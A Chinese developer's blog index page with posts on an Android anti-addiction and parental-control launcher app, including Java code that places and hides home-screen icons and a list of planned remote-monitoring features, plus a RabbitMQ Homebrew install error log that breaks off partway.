<!DOCTYPE html>


<html lang="zh-CN,en,zh-TW,default">
  

    <head>
      <meta charset="utf-8" />
       
      <meta name="keywords" content="java php javascript go rust 区块链 ipfs etherum 电商系统 营销系统 游戏 智能合约" />
       
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> 张智进的博客</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
      />
      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    <link rel="alternate" href="/atom.xml" title="张智进的博客" type="application/atom+xml">
</head>
  </html>
</html>


<body>
  <div id="app">
    
      
    <main class="content on">
      


<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['面朝大海，春暖花开', '愿你一生努力，一生被爱', '想要的都拥有，得不到的都释怀'],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-防沉迷app-项目总结2"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/26/%E9%98%B2%E6%B2%89%E8%BF%B7app-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%932/"
    >防沉迷app-项目总结2</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/26/%E9%98%B2%E6%B2%89%E8%BF%B7app-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%932/" class="article-date">
  <time datetime="2022-04-26T02:50:08.000Z" itemprop="datePublished">2022-04-26</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/">技术生活 - 编程技术 - 项目总结</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="防沉迷项目总结（2）"><a href="#防沉迷项目总结（2）" class="headerlink" title="防沉迷项目总结（2）"></a>防沉迷项目总结（2）</h1><h2 id="软件开发的需求变动问题"><a href="#软件开发的需求变动问题" class="headerlink" title="软件开发的需求变动问题"></a>软件开发的需求变动问题</h2><p>作为开发者，最不喜欢的场景是需求朝令夕改。频繁的需求改动对开发者的耐性和信心是极大的打击。</p>
<ol>
<li>心情：这个就不用多说了，开发是很枯燥的。让程序员重复做一个事情，不停的重复更枯燥。</li>
<li>设计问题：最初a需求的技术方案，开发者设计好了，需求变了之后，技术方案都有可能会受到影响。</li>
</ol>
<p>对于这个问题，目前是无解。市场是对的，老板也是对的，需求没错。所以就需要开发者提高自身素质，对潜在的需求变动要有前瞻性。在技术设计方面<br>对于可能的变动预留足够的弹性空间。</p>
<h3 id="一个被需求折磨的例子"><a href="#一个被需求折磨的例子" class="headerlink" title="一个被需求折磨的例子"></a>一个被需求折磨的例子</h3><p>需求a：桌面app只需要显示和隐藏<br>a基础上改动后的需求b：要初始化显示系统app，同时行列也要变化。</p>
<p>这块改动比较大，改动之前的就不贴代码了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"> package com.benny.openlauncher.util;</span><br><span class="line"></span><br><span class="line">import android.util.Log;</span><br><span class="line"></span><br><span class="line">import com.benny.openlauncher.AppObject;</span><br><span class="line">import com.benny.openlauncher.activity.HomeActivity;</span><br><span class="line">import com.benny.openlauncher.model.App;</span><br><span class="line">import com.benny.openlauncher.model.Item;</span><br><span class="line">import com.benny.openlauncher.widget.CellContainer;</span><br><span class="line">import com.benny.openlauncher.widget.Desktop;</span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">// 桌面app排列有关工具类</span><br><span class="line">public class DeskTopUtils &#123;</span><br><span class="line"></span><br><span class="line">    // 第一次初始化</span><br><span class="line">    public static void onCreate(List&lt;App&gt; apps) &#123;</span><br><span class="line">       // TODO </span><br><span class="line">    &#125;</span><br><span class="line">    // 添加到hide，并从数据库移除</span><br><span class="line">    public static void removeFromDesk(String pkg) &#123;</span><br><span class="line">        Log.d(&quot;DeskTopUtils&quot;,&quot;remove local app from desk pkg:&quot;+ pkg);</span><br><span class="line">        // hide 更新</span><br><span class="line">        ArrayList&lt;String&gt; hiddenList = AppSettings.get().getHiddenAppsList();</span><br><span class="line">        if(HomeActivity._db == null )return;</span><br><span class="line"></span><br><span class="line">        // 根据pkg找到app</span><br><span class="line">        List&lt;App&gt;  apps =  AppManager.getInstance(AppObject.get()).getNonFilteredApps();</span><br><span class="line">        App findApp = null;</span><br><span class="line">        for (App app : apps) &#123;</span><br><span class="line">            if (app.getComponentName().contains(pkg)) &#123;</span><br><span class="line">                findApp = app;</span><br><span class="line">                // 构造Intent string</span><br><span class="line">                HomeActivity._db.deleteItemByIntent(Tool.getIntentAsString(Tool.getIntentFromApp(findApp)));</span><br><span class="line">                Log.d(&quot;DeskTopUtils&quot;,&quot;remove find match local app &quot;+ findApp.getComponentName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if( findApp == null ) &#123;</span><br><span class="line">            Log.d(&quot;DeskTopUtils&quot;,&quot;removeFromDesk can&#x27;t find match local app &quot;+ pkg);</span><br><span class="line">            return;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Log.d(&quot;DeskTopUtils&quot;,&quot;removeFromDesk find match local app &quot;+ findApp.getComponentName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 生成坐标</span><br><span class="line">    private static String genCoordinate(List&lt;List&lt;Item&gt;&gt; itemLists )&#123;</span><br><span class="line">        String coordinateStr =  &quot;&quot;;</span><br><span class="line">        for (int pageCount = 0; pageCount &lt; itemLists.size(); pageCount++) &#123;</span><br><span class="line">            List&lt;Item&gt; page = itemLists.get(pageCount);</span><br><span class="line">            for (int j = 0; j &lt; page.size(); j++) &#123;</span><br><span class="line">                coordinateStr += &quot;(&quot;+pageCount +&quot;,&quot; + page.get(j)._x+&quot;,&quot;+page.get(j)._y+&quot;);&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return coordinateStr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 从hide移除，并从desktop中选择合适位置，添加进去</span><br><span class="line">    public static void addToDesk(String pkg) &#123;</span><br><span class="line">        // hide 更新</span><br><span class="line">        ArrayList&lt;String&gt; hiddenList = AppSettings.get().getHiddenAppsList();</span><br><span class="line">        if(HomeActivity._db == null )return;</span><br><span class="line"></span><br><span class="line">        // 根据pkg找到app</span><br><span class="line">        List&lt;App&gt;  apps =  AppManager.getInstance(AppObject.get()).getNonFilteredApps();</span><br><span class="line">        App findApp = null;</span><br><span class="line">        for (App app : apps) &#123;</span><br><span class="line">            if (app.getComponentName().contains(pkg)) &#123;</span><br><span class="line">                findApp = app;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if( findApp == null ) &#123;</span><br><span class="line">            Log.d(&quot;DeskTopUtils&quot;,&quot;addToDesk can&#x27;t find match local app &quot;+ pkg);</span><br><span class="line">            return;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Log.d(&quot;DeskTopUtils&quot;,&quot;addToDesk find match local app &quot;+ findApp.getComponentName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 数据库更新</span><br><span class="line">        List&lt;CellContainer&gt; _pages = new ArrayList&lt;&gt;();</span><br><span class="line">        List&lt;List&lt;Item&gt;&gt; desktopItems = HomeActivity._db.getDesktop();</span><br><span class="line"></span><br><span class="line">        String deskGrid = genCoordinate(desktopItems);</span><br><span class="line">        int row = AppSettings.get().getDesktopRowCount();</span><br><span class="line">        int col = AppSettings.get().getDesktopColumnCount();</span><br><span class="line"></span><br><span class="line">        // 查找每一个page中的合适位置</span><br><span class="line">        String t_point = &quot;&quot;;</span><br><span class="line">        int find_x = 0;</span><br><span class="line">        int find_y = 0;</span><br><span class="line">        boolean find = false;</span><br><span class="line"></span><br><span class="line">        // 倒序，刚容易找到位置，先这样</span><br><span class="line">        for (int pageCount = 0; pageCount &lt; desktopItems.size(); pageCount++) &#123;</span><br><span class="line">            List&lt;Item&gt; page = desktopItems.get(pageCount);</span><br><span class="line">            // 如果倒序，刚容易找到位置，先这样;取舍：这样可以在添加的时候，优先使用最前面的空缺位置</span><br><span class="line">            for( int j=0;j&lt;page.size();j++) &#123;</span><br><span class="line">                //尝试在每一个元素周边寻找区域</span><br><span class="line">                Item t_item = page.get(j);</span><br><span class="line">                int t_x = t_item._x;</span><br><span class="line">                int t_y = t_item._y;</span><br><span class="line">                // 右边</span><br><span class="line">                int tx_top = t_x-1;</span><br><span class="line">                if( tx_top &gt;=0 ) &#123;</span><br><span class="line">                    t_point = &quot;(&quot; +pageCount+&quot;,&quot;+tx_top+&quot;,&quot;+t_y+&quot;)&quot;;</span><br><span class="line">                    if( !deskGrid.contains( t_point ) ) &#123;</span><br><span class="line">                        find_x = tx_top;</span><br><span class="line">                        find_y = t_y;</span><br><span class="line">                        find = true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // 左边</span><br><span class="line">                tx_top = t_x +1;</span><br><span class="line">                if( tx_top &gt;=0 &amp;&amp; tx_top &lt; col )&#123;</span><br><span class="line">                    t_point = &quot;(&quot;+pageCount+&quot;,&quot;+tx_top+&quot;,&quot;+t_y+&quot;)&quot;;</span><br><span class="line">                    if( !deskGrid.contains( t_point ) ) &#123;</span><br><span class="line">                        find_x = tx_top;</span><br><span class="line">                        find_y = t_y;</span><br><span class="line">                        find = true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // 上边</span><br><span class="line">                int ty_top = t_y -1;</span><br><span class="line">                if( ty_top &gt;=0 )&#123;</span><br><span class="line">                    t_point = &quot;(&quot;+pageCount+&quot;,&quot;+t_x+&quot;,&quot;+ty_top+&quot;)&quot;;</span><br><span class="line">                    if( !deskGrid.contains( t_point ) ) &#123;</span><br><span class="line">                        find_x  = t_x;</span><br><span class="line">                        find_y = ty_top;</span><br><span class="line">                        find = true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // 下边</span><br><span class="line">                ty_top = t_y + 1;</span><br><span class="line">                if( ty_top &gt;=0 &amp;&amp; ty_top &lt; row)&#123;</span><br><span class="line">                    t_point = &quot;(&quot;+pageCount+&quot;,&quot;+t_x+&quot;,&quot;+ty_top+&quot;)&quot;;</span><br><span class="line">                    if( !deskGrid.contains( t_point ) ) &#123;</span><br><span class="line">                        find_x  = t_x;</span><br><span class="line">                        find_y = ty_top;</span><br><span class="line">                        find = true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Item newItem = Item.newAppItem(findApp);</span><br><span class="line">            newItem._spanY = 1;</span><br><span class="line">            newItem._spanX = 1;</span><br><span class="line">            if( find ) &#123;</span><br><span class="line">                newItem._x = find_x;</span><br><span class="line">                newItem._y = find_y;</span><br><span class="line">                HomeActivity._db.saveItem(newItem, pageCount, Definitions.ItemPosition.Desktop);</span><br><span class="line">                Log.d(&quot;DeskTopUtils&quot;,&quot;addToDesk find location to locate app  page,x,y=&quot;+pageCount +&quot;,&quot; +find_x+&quot;,&quot;+ find_y +&quot;，package=&quot;+Tool.getIntentAsString(newItem._intent));</span><br><span class="line">                break;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 新建一个页面，放置app</span><br><span class="line">                if ( pageCount == desktopItems.size()-1 ) &#123;</span><br><span class="line">                    int newPage = pageCount + 1;</span><br><span class="line">                    newItem._x = 0;</span><br><span class="line">                    newItem._y = 0;</span><br><span class="line">                    HomeActivity._db.saveItem(newItem, newPage, Definitions.ItemPosition.Desktop);</span><br><span class="line">                    Log.d(&quot;DeskTopUtils&quot;, &quot;addToDesk no location , new page ,  page,x,y=&quot; + newPage + &quot;,&quot; + find_x + &quot;,&quot; + find_y + &quot;，package=&quot; + Tool.getIntentAsString(newItem._intent));</span><br><span class="line">                    break;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    Log.d(&quot;DeskTopUtils&quot;, &quot;addToDesk no location , query new page try&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF/" rel="tag">技术</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/" rel="tag">项目总结</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-防沉迷app-项目总结1"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/26/%E9%98%B2%E6%B2%89%E8%BF%B7app-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%931/"
    >防沉迷app-项目总结1</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/26/%E9%98%B2%E6%B2%89%E8%BF%B7app-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%931/" class="article-date">
  <time datetime="2022-04-26T02:10:04.000Z" itemprop="datePublished">2022-04-26</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/">技术生活 - 编程技术 - 项目总结</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="防沉迷项目总结（1）"><a href="#防沉迷项目总结（1）" class="headerlink" title="防沉迷项目总结（1）"></a>防沉迷项目总结（1）</h1><h2 id="防沉迷介绍"><a href="#防沉迷介绍" class="headerlink" title="防沉迷介绍"></a>防沉迷介绍</h2><p>现代社会，手机成了个人的计算中心，各种人与人、人与物的连接，都通过手机连接到每一个个体，极大的方便了人们的生活、学习、工作和娱乐。然而正是这样的便捷性，高度依赖性，使人们越来越离不开手机，很多人深陷其中，不能自拔，甚至严重影响正常的休息、生活、学习、工作和交流，越来越考验人的自律能力。因此很多人需要适当的提醒、干预或者强制的方式来摆脱这种状况。“防沉迷APP”的想法被创业者发现并实施。</p>
<p>作为一款手机防沉迷软件，该软件在解救两亿手机控、低头族，让她成为学生、考生、家长、低头族、手机控、战拖们的必备应用。</p>
<p>目前知名的国内防沉迷app有：格雷盒子，青柠守护，阳光守护等</p>
<h2 id="防沉迷技术难点"><a href="#防沉迷技术难点" class="headerlink" title="防沉迷技术难点"></a>防沉迷技术难点</h2><h3 id="设置默认桌面"><a href="#设置默认桌面" class="headerlink" title="设置默认桌面"></a>设置默认桌面</h3><p>目前已知问题，小米桌面如果没有经过官方的认证，就不让设置其他第三方桌面（launcher）设置为默认桌面。小米这么做也有道理。因为第三方桌面有可能会做一些伤害用户体验的行为。有官方的背书，能在一定程度上避免这个问题。同样的问题还在华为手机上出现。华为手机直接是不让设置默认桌面，根本没有这个选项。</p>
<h3 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h3><p>防沉迷，最重要的是让用户在使用手机的时候，只能操作某一类或者某一些app。这里问题就来了，怎么做到呢？第一想到的就是设置默认桌面，同时隐藏设置桌面的配置。但是上面说了，目前主流手机厂商对这方面有着自己的顾虑和思考。<br>那没有没有可能在不支持的手机上支持用户app开机启动，同时只允许打开自己的app，不允许切换到其他app，达到类似launcher（桌面）的效果呢？<br>答案是肯定的。</p>
<h3 id="手机兼容性"><a href="#手机兼容性" class="headerlink" title="手机兼容性"></a>手机兼容性</h3><p>安卓手机厂商众多，各种改。而防沉迷用到的api又比较底层，兼容性是一个让开发者头疼的问题。</p>
<h3 id="屏蔽其他app"><a href="#屏蔽其他app" class="headerlink" title="屏蔽其他app"></a>屏蔽其他app</h3><p>屏蔽有2个思路</p>
<ol>
<li>控制launcher，隐藏app的icon图标。这个没啥好说的</li>
<li>类似如下这个效果。只要用户点击任何其他app都提示，app被禁止</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220426102755.png" alt="20220426102755"></p>
<h3 id="权限自动点击"><a href="#权限自动点击" class="headerlink" title="权限自动点击"></a>权限自动点击</h3><p>由于需要比较多的权限，不同手机的设置路径也不尽相同。如果能实现自动点击，自动选择，无疑会给用户很大的帮助。</p>
<h3 id="手机远程控制"><a href="#手机远程控制" class="headerlink" title="手机远程控制"></a>手机远程控制</h3><h4 id="远程获取通讯录"><a href="#远程获取通讯录" class="headerlink" title="远程获取通讯录"></a>远程获取通讯录</h4><h4 id="远程读取用户手机短信"><a href="#远程读取用户手机短信" class="headerlink" title="远程读取用户手机短信"></a>远程读取用户手机短信</h4><h4 id="远程读取用户通话记录"><a href="#远程读取用户通话记录" class="headerlink" title="远程读取用户通话记录"></a>远程读取用户通话记录</h4><h4 id="远程获取用户手机截屏"><a href="#远程获取用户手机截屏" class="headerlink" title="远程获取用户手机截屏"></a>远程获取用户手机截屏</h4><h4 id="远程录制用户手机屏幕"><a href="#远程录制用户手机屏幕" class="headerlink" title="远程录制用户手机屏幕"></a>远程录制用户手机屏幕</h4><h4 id="远程锁定被控制手机"><a href="#远程锁定被控制手机" class="headerlink" title="远程锁定被控制手机"></a>远程锁定被控制手机</h4><h4 id="远程控制被控手机app删除或者增加"><a href="#远程控制被控手机app删除或者增加" class="headerlink" title="远程控制被控手机app删除或者增加"></a>远程控制被控手机app删除或者增加</h4><h4 id="远程控制被控手机app打开或者关闭"><a href="#远程控制被控手机app打开或者关闭" class="headerlink" title="远程控制被控手机app打开或者关闭"></a>远程控制被控手机app打开或者关闭</h4><h4 id="远程控制被控手机录音"><a href="#远程控制被控手机录音" class="headerlink" title="远程控制被控手机录音"></a>远程控制被控手机录音</h4><h4 id="远程控制被控手机活动范围，设定电子围栏，超出范围提醒"><a href="#远程控制被控手机活动范围，设定电子围栏，超出范围提醒" class="headerlink" title="远程控制被控手机活动范围，设定电子围栏，超出范围提醒"></a>远程控制被控手机活动范围，设定电子围栏，超出范围提醒</h4><h2 id="防沉迷app思考和拓展"><a href="#防沉迷app思考和拓展" class="headerlink" title="防沉迷app思考和拓展"></a>防沉迷app思考和拓展</h2><p>后话：做防沉迷这段时间，确实发现这个市场还挺大的。我们做的方向是，类似阳光守护那种。有两个端：家长端和孩子端。<br>家长端：可以控制孩子的手机，包括获取孩子手机app，远程截屏，远程锁屏等。<br>孩子端：只可以打开被家长允许的app，只能在规定时间玩手机等</p>
<p>其实,有了这个技术，应用场景是很多的。从控制端和被控端来思考</p>
<ol>
<li><p>假设只有一个端</p>
<ul>
<li>可以做成一个防沉迷app单机版，解决学生等老离不开手机的问题，帮自己改掉习惯，投入学习</li>
<li>可以做成一个习惯训练app，设置一个社区，社区的人打卡比赛，谁能养成习惯给予奖励。</li>
</ul>
</li>
<li><p>有一个控制端和一个被控端</p>
<ul>
<li>家长控制孩子</li>
<li>老师控制学生</li>
<li>孩子给上了年纪的父母远程协助</li>
<li>其他场景</li>
</ul>
</li>
</ol>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>做了这么多，还有一些没解决问题。有意者可以联系 Q:2169564366 （备注：防沉迷）技术交流。一起成长</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF/" rel="tag">技术</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/" rel="tag">项目总结</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-fix-mac-rabbitmq-issue"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/19/fix-mac-rabbitmq-issue/"
    >fix-mac-rabbitmq-issue</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/19/fix-mac-rabbitmq-issue/" class="article-date">
  <time datetime="2022-04-19T12:27:21.000Z" itemprop="datePublished">2022-04-19</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/">技术生活 - 编程技术 - 后端技术</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>今天在mac 下面配置 rabbitmq的环境，按照官方文档 brew install rabbitmq 竟然报错了，如下。<br>核心错误 *** No formulae found in taps *** </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">yyy@xxx-MacBook-Pro ~ % brew install rabbitmq</span><br><span class="line"></span><br><span class="line">Running `brew update --preinstall`...</span><br><span class="line">fatal: Could not resolve HEAD to a revision</span><br><span class="line">==&gt; Tapping homebrew/cask</span><br><span class="line">Cloning into &#x27;/usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask&#x27;...</span><br><span class="line">remote: Enumerating objects: 633392, done.</span><br><span class="line">remote: Counting objects: 100% (14/14), done.</span><br><span class="line">remote: Compressing objects: 100% (14/14), done.</span><br><span class="line">remote: Total 633392 (delta 6), reused 2 (delta 0), pack-reused 633378</span><br><span class="line">Receiving objects: 100% (633392/633392), 298.02 MiB | 9.22 MiB/s, done.</span><br><span class="line">Resolving deltas: 100% (448299/448299), done.</span><br><span class="line">Updating files: 100% (4055/4055), done.</span><br><span class="line">Tapped 3996 casks (4,066 files, 318.3MB).</span><br><span class="line">Warning: No available formula with the name &quot;rabbitmq&quot;.</span><br><span class="line">==&gt; Searching for similarly named formulae...</span><br><span class="line">Error: No similarly named formulae found.</span><br><span class="line">==&gt; Searching for a previously deleted formula (in the last month)...</span><br><span class="line">Error: No previously deleted formula found.</span><br><span class="line">==&gt; Searching taps on GitHub...</span><br><span class="line">Error: No formulae found in taps.</span><br><span class="line">jim@zhangs-MacBook-Pro ~ % brew install rabbitmq</span><br><span 